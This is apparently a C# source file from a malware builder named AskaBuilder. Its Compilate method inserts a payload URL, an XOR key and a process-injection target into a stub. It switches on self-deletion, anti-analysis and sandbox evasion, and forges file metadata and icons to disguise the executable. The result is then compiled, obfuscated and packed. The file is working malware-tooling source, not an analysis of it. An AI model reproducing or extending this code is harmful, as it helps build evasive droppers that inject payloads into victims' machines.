using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;
using System.Web.Configuration;

namespace AskaBuilder.AskaAlgorithms.Builder
{
    internal class BuilderEngine
    {
        public static bool Compilate(string UrlApp, byte[] xorBytes, string InjectProcess, string OutPath, bool SelfDelete, bool AntiAnalysis, bool AntiAnyRun, bool MutexControl, string MutexValue, bool Obfuscate, bool Packer, string assemblyFile, string iconFile)
        {

            string csharpcode = Properties.Resources.stub
                .Replace("%InjectProcess%", InjectProcess)
                .Replace("%UrlTargetFile%", UrlApp);


            string newKey = "public static byte[] Key = new byte[] { " + string.Join(", ", xorBytes.Select(b => "0x" + b.ToString("X2"))) + " };";
            csharpcode = Regex.Replace(
                csharpcode,
                @"public static byte\[\] Key = new byte\[\] \{.*?\};",
                newKey,
                RegexOptions.Singleline
            );


            CompilerParameters parameters = new CompilerParameters
            {
                GenerateExecutable = true,
                OutputAssembly = OutPath,
                CompilerOptions = "/target:winexe /platform:x86",
                IncludeDebugInformation = false
            };

            if (!string.IsNullOrEmpty(assemblyFile) && File.Exists(assemblyFile))
            {
                parameters.CompilerOptions += " /define:UseAssembly";
                var metadata = File.ReadAllLines(assemblyFile);

                string title = metadata.Length > 0 ? metadata[0] : "N/A";
                string description = metadata.Length > 1 ? metadata[1] : "N/A";
                string company = metadata.Length > 2 ? metadata[2] : "N/A";
                string product = metadata.Length > 3 ? metadata[3] : "N/A";
                string copyright = metadata.Length > 4 ? metadata[4] : "N/A";
                string trademarks = metadata.Length > 5 ? metadata[5] : "N/A";
                string fileVersion = metadata.Length > 6 ? metadata[6] : "N/A";
                string productVersion = metadata.Length > 7 ? metadata[7] : "N/A";

                csharpcode = csharpcode.Replace("%TITLE%", title);
                csharpcode = csharpcode.Replace("%DESC%", description);
                csharpcode = csharpcode.Replace("%COMPANY%", company);
                csharpcode = csharpcode.Replace("%PRODUCT%", product);
                csharpcode = csharpcode.Replace("%COPYRIGHT%", copyright);
                csharpcode = csharpcode.Replace("%TRADEMARK%", trademarks);
                csharpcode = csharpcode.Replace("%VERSION%", productVersion);
                csharpcode = csharpcode.Replace("%FILE_VERSION%", fileVersion);
            }

            if (SelfDelete)
            {
                parameters.CompilerOptions += " /define:SelfDelete";
            }

            if (AntiAnalysis)
            {
                parameters.CompilerOptions += " /define:AntiAnalysis";
            }

            if (AntiAnyRun)
            {
                parameters.CompilerOptions += " /define:AntiAnyRun";
            }

            if (MutexControl)
            {
                parameters.CompilerOptions += " /define:MutexControl";
                csharpcode = csharpcode.Replace("%MUTEX%", MutexValue);
            }

            parameters.ReferencedAssemblies.Add("System.dll");
            parameters.ReferencedAssemblies.Add("System.Management.dll");
            parameters.ReferencedAssemblies.Add("System.Linq.dll");
            parameters.ReferencedAssemblies.Add("System.Core.dll");

            if (!string.IsNullOrEmpty(iconFile) && File.Exists(iconFile))
            {
                parameters.CompilerOptions += $" /win32icon:\"{iconFile}\"";
            }

            using (CSharpCodeProvider codeProvider = new CSharpCodeProvider())
            {
                CompilerResults results = codeProvider.CompileAssemblyFromSource(parameters, csharpcode);

                if (results.Errors.Count > 0)
                {
                    using (StreamWriter writer = new StreamWriter("compilation_errors.txt", true))
                    {
                        foreach (CompilerError error in results.Errors)
                        {
                            writer.WriteLine($"Error: {error.ErrorText} in {error.FileName} at {error.Line}:{error.Column}");
                        }
                    }
                    throw new InvalidOperationException("Failed to compile the stub. Check compilation_errors.txt for details.");
                }

                if (Obfuscate)
                {
                    ObfuscatorEngine.PerformObfuscation(OutPath);
                }

                if (Packer)
                {
                    PackerEngine.PerformPacking(OutPath, Obfuscate, iconFile, assemblyFile);
                }
            }
            return true;
        }
    }
}
